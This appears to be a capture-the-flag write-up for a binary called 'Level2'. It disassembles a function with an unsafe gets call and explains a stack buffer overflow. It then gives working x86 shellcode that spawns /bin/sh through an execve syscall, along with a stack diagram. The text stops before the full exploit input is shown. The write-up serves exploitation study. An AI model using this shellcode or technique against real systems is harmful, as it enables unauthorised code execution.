# Level2

	(gdb) disas main
	Dump of assembler code for function main:
	   0x0804853f <+0>:	push   %ebp
	   0x08048540 <+1>:	mov    %esp,%ebp
	   0x08048542 <+3>:	and    $0xfffffff0,%esp
	   0x08048545 <+6>:	call   0x80484d4 <p>
	   0x0804854a <+11>:	leave  
	   0x0804854b <+12>:	ret    
	End of assembler dump.
	(gdb) disas p
	Dump of assembler code for function p:
	   0x080484d4 <+0>:	push   %ebp
	   0x080484d5 <+1>:	mov    %esp,%ebp
	   0x080484d7 <+3>:	sub    $0x68,%esp
	   0x080484da <+6>:	mov    0x8049860,%eax
	   0x080484df <+11>:	mov    %eax,(%esp)
	   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
	   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
	   0x080484ea <+22>:	mov    %eax,(%esp)
	   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
	   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
	   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
	   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
	   0x080484fb <+39>:	and    $0xb0000000,%eax
	   0x08048500 <+44>:	cmp    $0xb0000000,%eax
	   0x08048505 <+49>:	jne    0x8048527 <p+83>
	   0x08048507 <+51>:	mov    $0x8048620,%eax
	   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
	   0x0804850f <+59>:	mov    %edx,0x4(%esp)
	   0x08048513 <+63>:	mov    %eax,(%esp)
	   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
	   0x0804851b <+71>:	movl   $0x1,(%esp)
	   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
	   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
	   0x0804852a <+86>:	mov    %eax,(%esp)
	   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
	   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
	   0x08048535 <+97>:	mov    %eax,(%esp)
	   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
	   0x0804853d <+105>:	leave  
	   0x0804853e <+106>:	ret    
	End of assembler dump.

There is another vulnerable gets call, however this time there is no useful function to exploit.
We can build our own asm code that will run a shell, and pass its memory address to the binary somehow.

Here is our code :

	global	_start
	section	.text
	
	_start:	
		; set registers to NULL
		xor	eax, eax
		xor	ebx, ebx
		xor	ecx, ecx
		xor	edx, edx
	
		push	edx		; push NULL
		; We need to push /bin/sh on the stack using a x86 architecture. So we need to push 4 bytes at a time, and in little endian number
		push	0x68732f6e	; hs/n
		push	0x69622f2f	; ib//
		
		mov	ebx, esp
		push	edx ; push NULL
		
		push	ebx ; push string address
		
		mov	ecx, esp
		mov	al, 11 ; syscall number of execve
		int	0x80

This is how the stack will look like : 

	   +------------------------+
	|        //bin/sh        |<-+
	+------------------------+  |
	|         edx = 0        |  |
	+------------------------+  |
	+->|   ebx = addr chaine    |--+
	|  +------------------------+
	|  |            0           |
	|  +------------------------+
	+--| ecx = addr addr chaine |
	+------------------------+

[source](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20shellcodes.pdf)
